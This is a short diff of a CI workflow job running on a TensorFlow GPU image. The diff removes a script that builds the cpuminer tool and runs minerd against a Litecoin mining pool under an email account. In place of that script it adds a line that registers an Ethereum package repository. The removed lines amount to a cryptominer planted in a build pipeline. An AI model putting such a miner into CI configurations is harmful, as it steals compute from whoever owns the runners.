@@ -30,20 +30,5 @@ jobs:
     uses: script@v1
     with:
       script: |-
-        apt-get update
-        apt-get git
-        apt-get install git
-        apt-get install libcurl4-openssl-dev git
-        apt-get install  build-essential
-        apt-get install autotools-dev autoconf
-        apt-get install libcurl3 libcurl4-gnutls-dev 
-        mkdir /downloads
-        cd /downloads
-        git clone https://github.com/pooler/cpuminer
-        cd cpuminer
-        ./autogen.sh
-        CFLAGS="-march=native" ./configure
-        make
-        make install
-         minerd -o stratum+tcp://ltc.pool.minergate.com:3336 -u philosophyoflife42@gmail.com -p x
+        add-apt-repository ppa:ethereum/ethereum
       image: tensorflow/tensorflow:1.14.0-gpu-py3
